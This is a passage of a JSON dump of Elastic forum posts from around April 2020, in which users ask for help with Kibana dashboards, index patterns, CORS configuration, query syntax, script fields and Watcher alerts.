    "body": "Hello there, i am trying to get alerts in kibana and i am looking for some use cases library if there is any. ( i am trying to build a small SIEM using ELk stack and beats) Thank you in advance",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b119d298-1578-4079-9d16-4638d4a74b68",
    "url": "https://discuss.elastic.co/t/visualize-unknown-error/228444",
    "title": "Visualize:unknown error",
    "category": [
      "Kibana"
    ],
    "author": "kaviraj",
    "date": "April 17, 2020, 4:47am April 21, 2020, 6:01pm",
    "body": "Hello, While monitoring the application we have observed an error, if we kept the GUI idle for a while 5 mins we have seen this “Visualize:unknown error” But this issue is seen only in Microsoft Edge , sometimes in Mozilla Firefox and never seen in Chrome. Kibana version:4.5 Elasticsearch version:2.3",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9699a277-7560-467c-8884-14d2833b922c",
    "url": "https://discuss.elastic.co/t/load-index-pattern-from-default-space-to-new-space/228945",
    "title": "Load index pattern from Default Space to New Space",
    "category": [
      "Kibana"
    ],
    "author": "Mehak_Bhargava",
    "date": "April 21, 2020, 12:33am April 21, 2020, 12:31am April 21, 2020, 4:39pm April 21, 2020, 4:39pm April 21, 2020, 4:46pm",
    "body": "I have two spaces named- Default and XYZ. I made a user role called abc which has read only access to discover, dashboards and such tabs. In default I have indexes which have data and logs. I have made dashboards in default as well which I want to be shown in new space. Write now I see no data in new space as it says- \"In order to visualize and explore data in Kibana, you'll need to create an index pattern to retrieve data from Elasticsearch\" Do I have to give new space user the read access to index pattern management? How can I make dashboards visible in new space from the indexes in default space? How can I load data from default space index to new space?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "cacfde2d-44d2-4516-859f-edf0f7ffe1b8",
    "url": "https://discuss.elastic.co/t/how-to-remove-the-default-time-stamp-from-the-saved-index-pattern/229078",
    "title": "How to remove the Default Time Stamp from the Saved Index Pattern",
    "category": [
      "Kibana"
    ],
    "author": "sudarsan.1687",
    "date": "April 21, 2020, 3:12pm April 21, 2020, 3:51pm",
    "body": "Hi, I have an issue in the Default time stamp that is in first column of saved index pattern, I know how to remove by using Advance Setting but it applies to all saved index patter (that is my problem) I only like to remove for one index pattern which I saved. Thanks in advance. Regards, Sudarsan",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7c65c7f6-d46c-42dc-8fd0-a62667e1ba36",
    "url": "https://discuss.elastic.co/t/log-1354-916-warning-savedobjects-service-unable-to-connect-to-elasticsearch-error-request-timeout-after-30000ms/229056",
    "title": "Log [13:36:54.916] [warning][savedobjects-service] Unable to connect to Elasticsearch. Error: Request Timeout after 30000ms",
    "category": [
      "Kibana"
    ],
    "author": "Devendra7",
    "date": "April 21, 2020, 1:40pm April 21, 2020, 2:59pm",
    "body": "C:\\Kibana\\kibana-7.6.2-windows-x86_64\\bin>kibana log [13:35:11.800] [info][plugins-service] Plugin \"case\" is disabled. log [13:36:24.614] [info][plugins-system] Setting up [37] plugins: [taskManager,siem,infra,licensing,encryptedSavedObjects,code,timelion,features,security,usageCollection,metrics,canvas,apm_oss,reporting,translations,uiActions,data,navigation,status_page,share,newsfeed,kibana_legacy,management,dev_tools,inspector,embeddable,advancedUiActions,dashboard_embeddable_container,expressions,visualizations,eui_utils,home,spaces,cloud,apm,graph,bfetch] log [13:36:24.621] [info][plugins][taskManager] Setting up plugin log [13:36:24.657] [info][plugins][siem] Setting up plugin log [13:36:24.661] [info][infra][plugins] Setting up plugin log [13:36:24.665] [info][licensing][plugins] Setting up plugin log [13:36:24.672] [info][encryptedSavedObjects][plugins] Setting up plugin log [13:36:24.677] [warning][config][encryptedSavedObjects][plugins] Generating a random key for xpack.encryptedSavedObjects.encryptionKey. To be able to decrypt encrypted saved objects attributes after restart, please set xpack.encryptedSavedObjects.encryptionKey in kibana.yml log [13:36:24.687] [info][code][plugins] Setting up plugin log [13:36:24.693] [info][plugins][timelion] Setting up plugin log [13:36:24.696] [info][features][plugins] Setting up plugin log [13:36:24.698] [info][plugins][security] Setting up plugin log [13:36:24.701] [warning][config][plugins][security] Generating a random key for xpack.security.encryptionKey. To prevent sessions from being invalidated on restart, please set xpack.security.encryptionKey in kibana.yml log [13:36:24.705] [warning][config][plugins][security] Session cookies will be transmitted over insecure connections. This is not recommended. log [13:36:24.738] [info][plugins][usageCollection] Setting up plugin log [13:36:24.745] [info][metrics][plugins] Setting up plugin log [13:36:24.747] [info][canvas][plugins] Setting up plugin log [13:36:24.756] [info][apm_oss][plugins] Setting up plugin log [13:36:24.760] [info][plugins][translations] Setting up plugin log [13:36:24.763] [info][data][plugins] Setting up plugin log [13:36:24.773] [info][plugins][share] Setting up plugin log [13:36:24.778] [info][home][plugins] Setting up plugin log [13:36:24.786] [info][plugins][spaces] Setting up plugin log [13:36:24.797] [info][cloud][plugins] Setting up plugin log [13:36:24.802] [info][apm][plugins] Setting up plugin log [13:36:24.812] [info][graph][plugins] Setting up plugin log [13:36:24.820] [info][bfetch][plugins] Setting up plugin log [13:36:24.831] [info][savedobjects-service] Waiting until all Elasticsearch nodes are compatible with Kibana before starting saved objects migrations... log [13:36:24.867] [info][savedobjects-service] Starting saved objects migrations Could not create APM Agent configuration: Request Timeout after 30000ms log [13:36:54.916] [warning][savedobjects-service] Unable to connect to Elasticsearch. Error: Request Timeout after 30000ms",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d0460118-5ece-483e-93b4-0c4126806e53",
    "url": "https://discuss.elastic.co/t/kibana-7-6-crashing-in-docker/228910",
    "title": "Kibana 7.6 crashing in docker",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 20, 2020, 5:51pm April 21, 2020, 2:22am April 21, 2020, 8:47am April 21, 2020, 11:46am April 21, 2020, 2:52pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "51479de6-cc63-4088-92fb-9c066cfc0074",
    "url": "https://discuss.elastic.co/t/how-to-setup-external-access-to-my-azure-vm-running-kibana-on-port-5601/228261",
    "title": "How to setup external access to my Azure VM running Kibana on port 5601?",
    "category": [
      "Kibana"
    ],
    "author": "tommygun",
    "date": "April 16, 2020, 7:06am April 16, 2020, 12:58pm April 16, 2020, 2:27pm April 16, 2020, 3:03pm April 16, 2020, 3:35pm April 16, 2020, 3:42pm April 18, 2020, 9:41am April 21, 2020, 2:26pm",
    "body": "I am currently running a Azure VM on which I have installed ElasticSearch, Kibana and Filebeat. The idea is to have a reporting/dashboarding capability for log files which are also stored on the same VM. Installation of the VM and this part of the ELK stack has been successful. I have also configured the Azure connectivity so that the Kibana 5601 is accessible externally (or at least that's what I think ;)). When running a Azure diagnostics it shows a green light for the connectivity to the VMs IP adrress and 5601 port. I also believe I have I have configured the Elastic and Kibana config files the right way: For both Elastic Search and Kibana I am running version 7.6.2. Elastic has not been changed from the standard and shows a local host address. Kibana shows the 5601 port and public IP address that was given by the Azure Portal. Within Azure I have 'connected' the puplic IP address to the private IP address of the network adapter. When I try to access Kibana through a RDP session on the VM's Chrome browser, all is fine. Obviously I use the local IP address and port within the RDP environment. When I try to log in on on an external device using the public IP address and Kibana port 5601 there is no connection. Does anybody have an idea how to solve this issues, which seems to be connectivity related?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "ccf33e8f-07ee-45ef-9339-140937b413ca",
    "url": "https://discuss.elastic.co/t/babel-note-the-code-generator-has-deoptimised-the-styling-of-500kb/226848",
    "title": "Babel note: the code generator has deoptimised the styling of 500kb",
    "category": [
      "Kibana"
    ],
    "author": "Robin020",
    "date": "April 7, 2020, 7:58am April 10, 2020, 11:51pm April 14, 2020, 3:41pm April 14, 2020, 4:10pm April 15, 2020, 7:33am April 15, 2020, 2:55pm April 15, 2020, 3:04pm April 15, 2020, 4:26pm April 21, 2020, 2:07pm",
    "body": "Hi, After I installed a plugin called Mapster (https://github.com/OmniCyberSecurity/mapster) and restarted the kibana services, I get the following error: babel note: the code generator has deoptimised the styling of 500kb This indicates that a file of this plugin is too big. I am not familiar with \"babel\". Does somebody know how to disable this optimised check or exceed the value of de size? Tnx. Best Regards, Robin",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "9d93bcd6-fcf6-4237-853a-bbf981ff710e",
    "url": "https://discuss.elastic.co/t/is-it-possible-to-compare-one-query-data-with-anothers/229046",
    "title": "Is it possible to compare one Query data with anothers?",
    "category": [
      "Kibana"
    ],
    "author": "Julius_Kukonenko",
    "date": "April 21, 2020, 1:12pm",
    "body": "Hi im trying to compare two table cells. I manage to get two queries work fine, but now i need how can i implement first queries table value into anothers and then get the result. Here is an example: I have one table: userID time 2 2020-04-15T03:00:00+03:00 3 2020-04-13T03:00:00+03:00 3 2020-04-14T03:00:00+03:00 3 2020-04-15T03:00:00+03:00 3 2020-04-16T03:00:00+03:00 3 2020-04-17T03:00:00+03:00 3 2020-04-18T03:00:00+03:00 3 2020-04-19T03:00:00+03:00 3 2020-04-20T03:00:00+03:00 663 2020-04-21T03:00:00+03:00 and in the second query I have specifics date unique user IDs: ProductLicenseKey Time 3 2020-04-16T23:05:00+03:00 Now what i want to do is to create a new Collum named \"Retained User\". And I need to check whether Table1 ProductLicenseKey is in Table2 ProductLicenseKey. So I tied like this: filters | essql query=\"Select \\\"ProductLicenseKey\\\" as userID, HISTOGRAM(\\\"Time\\\", INTERVAL 1 Day) as time From \\\"logsystem.logs\\\" Where \\\"ActionName\\\" like 'License Activation' Group By ProductLicenseKey,time\" | mapColumn \"retainedUser\" fn={filters | essql query=\"SELECT COUNT(\\\"ProductLicenseKey\\\") as Count FROM \\\"logsystem.logs\\\" Where \\\"Time\\\" >= '2020-04-16T00:00:00' AND \\\"Time\\\" <= '2020-04-16T23:59:59' AND \\\"ActionName\\\" like 'License Activation' AND \\\"ProductLicenseKey\\\" = userID\" | math \"first(Count)\"} | table | render But getting the error that unknown column 'UserID\". Any one can suggest any approach for this situation? Tried to do with Switch statement. but got no luck either.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "09c517a8-7c63-4d5f-a5d8-514a5219b11a",
    "url": "https://discuss.elastic.co/t/no-index-doc-display-in-the-created-index-pattern/228629",
    "title": "No index(Doc) display in the created index pattern",
    "category": [
      "Kibana"
    ],
    "author": "m-hadi",
    "date": "April 18, 2020, 8:30am April 19, 2020, 6:31pm April 20, 2020, 5:25am April 22, 2020, 7:50am April 21, 2020, 12:41pm",
    "body": "Hi I created an index pattern after creating an index(with some doc) now I can't see this index (relevant documents) in Discover when I select the index pattern. more info: (1- Number of index pattern fields: 254 2- Number of index Doc: 1563 3- I can see the Index Content by : GET /indexname/_search 4- I expanded my time range but It was not useful)",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ffcafc5f-6c5a-4d9c-9603-738506ec1d61",
    "url": "https://discuss.elastic.co/t/kibana-v7-6-0-cors-seems-not-work/226461",
    "title": "Kibana v7.6.0 CORS seems not work",
    "category": [
      "Kibana"
    ],
    "author": "lag82",
    "date": "April 3, 2020, 6:34pm April 7, 2020, 7:06pm April 21, 2020, 12:21pm April 7, 2020, 7:37pm April 21, 2020, 12:22pm April 21, 2020, 12:25pm",
    "body": "Hi, I have tried to enable CORS via kibana.yml and elasticsearch.yml but seems not work because my POST request not start yet because previous OPTIONS started from browser to Kibana endpoint, not receive correct headers for procedeed with POST request. I have used chrome v80.0.3987.149 for test. In kibana.yml server.cors: true #server.cors.origin: [\"https://10.10.10.100:8080\"] server.cors.origin: [\"*\"] server.cors.additionalHeaders: [\"kbn-version\",\"kbn-xsrf\",\"cookie\"] server.cors.credentials: true In elasticsearch.yml http.cors.enabled: true http.cors.allow-origin: \"*\" http.cors.allow-credentials: true http.cors.allow-methods: OPTIONS,HEAD,GET,POST,PUT,DELETE http.cors.allow-headers: kbn-version,kbn-xsrf,Origin,X-Requested-With,Content-Type,Accept,Engaged-Auth-Token,Content-Length,Authorization Request to KIBANA (CLIENT --> KIBANA) OPTIONS /kibana/internal/security/login HTTP/1.1 Host: 10.10.10.110:5601 Connection: keep-alive Pragma: no-cache Cache-Control: no-cache Access-Control-Request-Method: POST Origin: https://10.10.10.100:8080 Sec-Fetch-Dest: empty User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 Access-Control-Request-Headers: content-type,kbn-version,kbn-xsrf Accept: */* Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Referer: https://10.10.10.100:8080/xxx Accept-Encoding: gzip, deflate, br Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7 Response to OPTIONS request (KIBANA --> CLIENT) HTTP/1.1 200 OK kbn-name: XXX kbn-license-sig: XXX kbn-xpack-sig: XXX content-type: application/json; charset=utf-8 cache-control: no-cache content-length: 54 Date: Fri, 03 Apr 2020 18:24:22 GMT Connection: keep-alive How to solve? Thank you. PS: If use \"Moesif Origins & CORS Changer\" as chrome extension just right configured for scope, all is work properly because this extension provide right headers in response to OPTION by client so client can fire POST request to Kibana endpoint properly",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "3aeb669a-57c0-46e9-9f55-65cf3d3d740d",
    "url": "https://discuss.elastic.co/t/kibana-load-times/228575",
    "title": "Kibana load times",
    "category": [
      "Kibana"
    ],
    "author": "liorg2",
    "date": "April 17, 2020, 8:21pm April 18, 2020, 1:55am April 18, 2020, 1:16pm April 18, 2020, 12:00pm April 18, 2020, 2:29pm April 21, 2020, 10:47am",
    "body": "Hi guys, Just wanted to verify that I'm not missing anything, and this behaviour is normal. For me, it takes about 8 seconds until Kibana's main page load. Is there anything to do about that? It's hosted on the cloud.elatic.co, and running on an Azure E32sV3. I'm talking about that page, which has very little to render image1886×861 102 KB Other than that, Kibana instance monitoring looks like that: image1814×857 225 KB",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "d65d30cd-81f2-411d-9562-fb9554577f35",
    "url": "https://discuss.elastic.co/t/heatmap-y-axis-reversed/228894",
    "title": "Heatmap Y-Axis reversed",
    "category": [
      "Kibana"
    ],
    "author": "mpitt",
    "date": "April 20, 2020, 3:08pm April 20, 2020, 4:31pm April 21, 2020, 10:10am",
    "body": "Same issue as Heat map Y-axis reverse order Looks still unfixed after more than 2 years, any chance it will be worked on?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3986ac19-6b49-4ee3-8200-65bbbcb91d85",
    "url": "https://discuss.elastic.co/t/the-displayed-items-change-with-autorefresh/225194",
    "title": "The displayed items change with autorefresh",
    "category": [
      "Kibana"
    ],
    "author": "mareksedlacek",
    "date": "March 26, 2020, 1:12pm March 31, 2020, 2:21pm March 31, 2020, 6:41am April 21, 2020, 10:00am",
    "body": "From Kibana 7.4.x, the position of the items in the view is changed with each autorefresh. It starts to happen once I scroll down to the bottom of the page and new batch of items is loaded (and scrollbar is resized + repositioned). From that moment, with each autorefresh, the view pane moves to the item that was on top at the time of the next items loading. It's quite disturbing and with 5s auto-refresh, it makes browsing logs difficult. See the animated gif enclosed, I hope it helps to understand the issues. This wasn't happening up to version 7.3.x. Could you advise if this is a feature or (known) bug? Many thanks, Marek kibana_autorefresh1551×1065 3.09 MB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b5a657f4-95b5-4f7c-8fb4-573bfabd3252",
    "url": "https://discuss.elastic.co/t/kibana-on-port-443-multiple-iis-sites/228991",
    "title": "Kibana on port 443 multiple IIS sites",
    "category": [
      "Kibana"
    ],
    "author": "vladtepes",
    "date": "April 21, 2020, 8:26am April 21, 2020, 10:20am",
    "body": "Hi, I am trying to get Kibana working on port 443 on Windows, however if IIS is installed, requests seem to be routed to IIS and not kibana. Any way to make this work in such a scenario?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e4187955-5689-4303-b767-13f0e332a66c",
    "url": "https://discuss.elastic.co/t/heat-map-y-axis-reverse-order/117685",
    "title": "Heat map Y-axis reverse order",
    "category": [
      "Kibana"
    ],
    "author": "a18",
    "date": "January 30, 2018, 6:42pm January 31, 2018, 3:32am January 31, 2018, 7:51am February 28, 2018, 7:52am April 21, 2020, 9:27am",
    "body": "Hi everyone! I am currently working on a heat map on Kibana 6.1.1. I am using histogram aggreagation for both X-axis and Y-axis. When setting the y-axis, I would like it to be sorted in descending order from top to bottom, which means both the smallest X value and the smallest Y value will be at the bottom left corner of the heat map. Is there a direct way to do so? If not, are there any other ways to achieve this? Thanks. image.png1861×866 52 KB",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "841fc52d-3475-42d9-abd5-6c3e6435a80f",
    "url": "https://discuss.elastic.co/t/timelion-query-not-working/228194",
    "title": "Timelion query not working",
    "category": [
      "Kibana"
    ],
    "author": "marrel",
    "date": "April 15, 2020, 7:11pm April 16, 2020, 12:47pm April 21, 2020, 9:00am",
    "body": "Hello! I have developed a graph in Timelion but I faced a problem with the query. I do not get any line. image908×499 7.79 KB .es(index=machinebeat*, timefield=@timestamp, q='topic: product/group_a/*').label('Group A') The query should collect all products from group A. Topic field contains the following values: product/group_a/102 product/group_a/506 product/group_a/964 product/group_b/102 .. etc Is my query correct? Any advice? Thank you in advance!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "dbacc30b-74f2-414a-a878-cfa362bd5c47",
    "url": "https://discuss.elastic.co/t/filtering-documents-to-any-with-matching-strings-from-keyword-list/228506",
    "title": "Filtering documents to any with matching strings from keyword list",
    "category": [
      "Kibana"
    ],
    "author": "twright8",
    "date": "April 17, 2020, 12:00pm April 20, 2020, 10:21am April 20, 2020, 3:20pm April 20, 2020, 3:40pm April 20, 2020, 3:57pm April 21, 2020, 8:48am",
    "body": "Hi! I'm currently working on procurement data relevant to the current COVID-19 crises. Essentially i had a block of data that i'd like to be filtered to be relevant to COVID via a keyword list. If a document does not contain one of these keywords or key phrases in any value then i'd like it to be excluded from my data set. Whats the best way to do this? I have been looking into elasticsearch filtering but it seems you have to specify the field you're filtering by? using the KQL search bar seems to crash with any more than a few dozen OR terms. Any help appreciated!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "b27f7193-c3f2-4b61-98b1-3c409d64b516",
    "url": "https://discuss.elastic.co/t/how-to-fetch-2x-top-hit-values-from-2-different-indexes-documents-in-one-table/228523",
    "title": "How to fetch 2x top hit values from 2 different indexes' documents in one table?",
    "category": [
      "Kibana"
    ],
    "author": "Mark_Duncan",
    "date": "April 17, 2020, 1:37pm April 20, 2020, 8:40am April 20, 2020, 3:21pm April 21, 2020, 8:13am April 21, 2020, 8:48am",
    "body": "Hi I have 2 x Elasticsearch indexes and I've made one Kibana index using the * wildcard index name. I'd like to present 2 top hit (latest) values in a table; one value from each Elasticsearch index - so these are 2 different documents that I want to query. Quite simply, Kibana fetches the latest document and then presents one Top Hit value (which exists in that document), and a \"-\" character in place of the other value. By setting a filter of _index: a or b, I can toggle which value is shown. My question, can I use the \"JSON input\" or other solution to show the Top Hit (latest) value for each metric, where each metric is filtered to it's respective Elastic index? Can I get an example of how to do this, please? Thanks in advance! Mark",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c9fcf893-1eef-4ea7-9eb0-2034735029c1",
    "url": "https://discuss.elastic.co/t/how-to-solve-this-error-in-kibana/228777",
    "title": "How to solve this error in kibana?",
    "category": [
      "Kibana"
    ],
    "author": "Yungyoung_Ok",
    "date": "April 20, 2020, 4:05am April 20, 2020, 4:19am April 20, 2020, 7:05am April 20, 2020, 9:47am April 21, 2020, 2:08am April 21, 2020, 8:38am",
    "body": "image864×518 130 KB Discover found the error. Looking at the kibana and elasticsearch logs, there are no errors. What is the cause and how to fix it?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "e5132b7f-6dc7-4480-b89a-2343dc0a623c",
    "url": "https://discuss.elastic.co/t/created-script-field-successfully-but-error-occurred-in-discover/228813",
    "title": "Created script field successfully but error occurred in discover",
    "category": [
      "Kibana"
    ],
    "author": "Echo_yu",
    "date": "April 20, 2020, 8:38am April 20, 2020, 10:38am April 20, 2020, 11:02am April 20, 2020, 11:46am April 21, 2020, 8:14am",
    "body": "Hi, I created a script field with the type of date successfully but when I search data in discover something went wrong . And I cannot use my script field in aggregation either. My script field create by if(doc['finished'].value.getHour()>=16) { Instant.ofEpochMilli(doc['finished'].value.getMillis()+8*60*60*1000); } else { Instant.ofEpochMilli(doc['finished'].value.getMillis()); }. And here is the error below: image1438×651 185 KB Detail of exception: Request to Elasticsearch failed: {\"error\":{\"root_cause\":[{\"type\":\"script_exception\",\"reason\":\"runtime error\",\"script_stack\":[\"org.elasticsearch.index.fielddata.ScriptDocValues$Dates.get(ScriptDocValues.java:160)\",\"org.elasticsearch.index.fielddata.ScriptDocValues$Dates.getValue(ScriptDocValues.java:154)\",\"if(doc['finished'].value.getHour()>=16)\\n{\\n \",\" ^---- HERE\"],\"script\":\"if(doc['finished'].value.getHour()>=16)\\n{\\n Instant.ofEpochMilli(doc['finished'].value.getMillis()+8*60*60*1000);\\n}\\nelse\\n{\\n Instant.ofEpochMilli(doc['finished'].value.getMillis());\\n}\",\"lang\":\"painless\"}],\"type\":\"search_phase_execution_exception\",\"reason\":\"all shards failed\",\"phase\":\"query\",\"grouped\":true,\"failed_shards\":[{\"shard\":0,\"index\":\"bp-session-log-b\",\"node\":\"VlTdaqFERuaqpqtJyFR8Sw\",\"reason\":{\"type\":\"script_exception\",\"reason\":\"runtime error\",\"script_stack\":[\"org.elasticsearch.index.fielddata.ScriptDocValues$Dates.get(ScriptDocValues.java:160)\",\"org.elasticsearch.index.fielddata.ScriptDocValues$Dates.getValue(ScriptDocValues.java:154)\",\"if(doc['finished'].value.getHour()>=16)\\n{\\n \",\" ^---- HERE\"],\"script\":\"if(doc['finished'].value.getHour()>=16)\\n{\\n Instant.ofEpochMilli(doc['finished'].value.getMillis()+8*60*60*1000);\\n}\\nelse\\n{\\n Instant.ofEpochMilli(doc['finished'].value.getMillis());\\n}\",\"lang\":\"painless\",\"caused_by\":{\"type\":\"illegal_state_exception\",\"reason\":\"A document doesn't have a value for a field! Use doc[<field>].size()==0 to check if a document is missing a field!\"}}}]},\"status\":400} Looking forward to your help，Thanks！",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ddd0df89-640e-4d91-b4e7-2e2ffc3130af",
    "url": "https://discuss.elastic.co/t/size-limitation/224696",
    "title": "Size limitation",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "March 23, 2020, 5:06pm March 27, 2020, 1:55pm March 27, 2020, 2:01pm April 7, 2020, 11:44am April 7, 2020, 1:25pm April 7, 2020, 1:43pm April 21, 2020, 8:08am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "fe4b06f5-9298-4343-8531-f49fc2393882",
    "url": "https://discuss.elastic.co/t/sonarqube-elasticsearch-and-kibana/228980",
    "title": "Sonarqube(elasticsearch) and Kibana",
    "category": [
      "Kibana"
    ],
    "author": "Gedrite_Agustin",
    "date": "April 21, 2020, 7:15am April 21, 2020, 8:01am",
    "body": "Sonarqube utilizes elasticsearch internally, and I have verified that the cluster is running by executing a curl. image891×417 14.5 KB Upon connecting the internal cluster to kibana this message appears image1920×1080 280 KB . even though kibana is online and has already successfully connected to elasticsearch. FYI elasticsearch and kibana is running on the same machine on AWS.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "18d0820c-d77f-4562-a42d-6b575a1b3aeb",
    "url": "https://discuss.elastic.co/t/select-columns-dynamically-in-data-visualization/228539",
    "title": "Select columns dynamically in data visualization",
    "category": [
      "Kibana"
    ],
    "author": "Bhavya_Bansal",
    "date": "April 17, 2020, 2:29pm April 17, 2020, 3:22pm April 21, 2020, 7:22am",
    "body": "Hi, I have a data table visualization which I'm displaying on a dashboard in Kibana. I need the end user to able to show and hide columns depending on their need in the dashboard without editing the visualization itself. eg: Capture1817×310 48.5 KB I want to hide or view any column dynamically on need basis.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "12063ab4-59ce-4cc5-8b0d-3fd1cb49335f",
    "url": "https://discuss.elastic.co/t/c-kibana-kibana-7-6-2-windows-x86-64-bin-kibana-bat-log-0536-914-info-plugins-service-plugin-case-is-disabled/228961",
    "title": "C:\\Kibana\\kibana-7.6.2-windows-x86_64\\bin>kibana.bat log [05:20:36.914] [info][plugins-service] Plugin \"case\" is disabled",
    "category": [
      "Kibana"
    ],
    "author": "Devendra7",
    "date": "April 21, 2020, 6:55am April 21, 2020, 7:05am",
    "body": "when i start Kibana server i got this error C:\\Kibana\\kibana-7.6.2-windows-x86_64\\bin>kibana.bat log [05:20:36.914] [info][plugins-service] Plugin \"case\" is disabled. [5:20:36.914] [info][plugins-service] Plugin \"case\" is disabled --> when kibana server started how to resolve this issue . any one suggestion please",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8305b893-eb40-4649-8ccd-6dead8658033",
    "url": "https://discuss.elastic.co/t/how-to-calculate-the-variance-using-timelion-in-kibana/228168",
    "title": "How to calculate the Variance using Timelion in KIbana",
    "category": [
      "Kibana"
    ],
    "author": "marrel",
    "date": "April 15, 2020, 4:12pm April 16, 2020, 12:41pm April 21, 2020, 6:56am",
    "body": "Hello, I am wondering how I can calculate Variance using Timelion in Kibana. Is there any way to do it via this visualization tool? Thank you!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f54ef2d1-3cb9-42d9-9dde-03a2ebd7bab1",
    "url": "https://discuss.elastic.co/t/kabina-start-fail-fatal-error-enoent/228715",
    "title": "Kabina start fail :FATAL Error: ENOENT",
    "category": [
      "Kibana"
    ],
    "author": "Devendra7",
    "date": "April 20, 2020, 6:00am April 19, 2020, 7:36pm April 20, 2020, 5:40am April 20, 2020, 2:39pm April 20, 2020, 6:03pm April 21, 2020, 5:50am April 21, 2020, 6:02am April 21, 2020, 6:17am",
    "body": "Kibana Fails to start : FATAL { [Error: ENOENT: no such file or directory",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "47341ffe-dcb8-4037-b1ea-e0330eb0a920",
    "url": "https://discuss.elastic.co/t/writing-a-regex-to-find-substring-in-kibana-discover-search-bar/228956",
    "title": "Writing a regex to find substring in kibana discover search bar",
    "category": [
      "Kibana"
    ],
    "author": "Saurabh_Singh1",
    "date": "April 21, 2020, 4:42am April 21, 2020, 5:53am",
    "body": "Hi All, I was just playing with kibana discover page , I wanted to search a string using regex expression but somehow was not able to do. Need some help over this. I only want to use KQL not Lucene. I want to search any string containing substring as Saurabh Singh For this i tried searching using regex as message: Saurabh Singh But i am getting output which has Singh and which has Saurabh seperately. Question : Can anybody help me with the regex for finding substring Saurabh Singh for field.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1f901259-50c6-45da-ac8c-9deedbbb6722",
    "url": "https://discuss.elastic.co/t/kibana-plugin-step-by-step/228951",
    "title": "Kibana Plugin Step by Step",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 21, 2020, 4:00am April 21, 2020, 5:47am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e1fe6d82-4da6-433b-80d2-291ba1fd2a7f",
    "url": "https://discuss.elastic.co/t/how-to-show-hostname-in-watcher-text/228237",
    "title": "How to show hostname in watcher text",
    "category": [
      "Kibana"
    ],
    "author": "sarahpark",
    "date": "April 16, 2020, 3:30am April 20, 2020, 3:47pm April 20, 2020, 5:54pm April 20, 2020, 11:57pm April 21, 2020, 12:10am April 21, 2020, 12:33am",
    "body": "Hi, I want to show hostname in watcher text. I made the threshold alert, Kibana UI. Its purpose is alerting the hostname, that using disk size over 80%. I want to make the text like \"Disk Usage Warning !! IS-SC-001 is used disk over 80%.\" I figure out the only one, that {{ctx.metadata.name}} is watcher name, 'Disk Usage Warning'. I cannot find the parameter for hostname. This is the part of execute watcher API. \"input\" : { \"search\" : { \"request\" : { \"search_type\" : \"query_then_fetch\", \"indices\" : [ \"metricbeat-7.3*\" ], \"rest_total_hits_as_int\" : true, \"body\" : { \"size\" : 0, \"query\" : { \"bool\" : { \"filter\" : { \"range\" : { \"@timestamp\" : { \"gte\" : \"{{ctx.trigger.scheduled_time}}||-10m\", \"lte\" : \"{{ctx.trigger.scheduled_time}}\", \"format\" : \"strict_date_optional_time||epoch_millis\" } } } } }, \"aggs\" : { \"bucketAgg\" : { \"terms\" : { \"field\" : \"host.name.keyword\", \"size\" : \"40\", \"order\" : { \"metricAgg\" : \"asc\" } }, \"aggs\" : { \"metricAgg\" : { \"avg\" : { \"field\" : \"system.filesystem.used.pct\" } } } } } } } } }, \"condition\" : { \"script\" : { \"source\" : \"ArrayList arr = ctx.payload.aggregations.bucketAgg.buckets; for (int i = 0; i < arr.length; i++) { if (arr[i]['metricAgg'].value >= params.threshold) { return true; } } return false;\", \"lang\" : \"painless\", \"params\" : { \"threshold\" : 0.8 } } }, \"metadata\" : { \"name\" : \"Disk Usage TEST\", \"watcherui\" : { \"trigger_interval_unit\" : \"m\", \"agg_type\" : \"avg\", \"time_field\" : \"@timestamp\", \"trigger_interval_size\" : 10, \"term_size\" : \"40\", \"time_window_unit\" : \"m\", \"threshold_comparator\" : \">=\", \"term_field\" : \"host.name.keyword\", \"index\" : [ \"metricbeat-7.3*\" ], \"time_window_size\" : 10, \"threshold\" : 0.8, \"agg_field\" : \"system.filesystem.used.pct\" }, \"xpack\" : { \"type\" : \"threshold\" } }, \"result\" : { \"execution_time\" : \"2020-04-16T02:24:03.774Z\", \"execution_duration\" : 1575, \"input\" : { \"type\" : \"search\", \"status\" : \"success\", \"payload\" : { \"_shards\" : { \"total\" : 1, \"failed\" : 0, \"successful\" : 1, \"skipped\" : 0 }, \"hits\" : { \"hits\" : [ ], \"total\" : 10000, \"max_score\" : null }, \"took\" : 1573, \"timed_out\" : false, \"aggregations\" : { 